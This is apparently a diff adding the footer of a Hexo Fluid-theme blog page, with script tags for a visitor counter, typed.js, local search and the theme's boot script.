+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
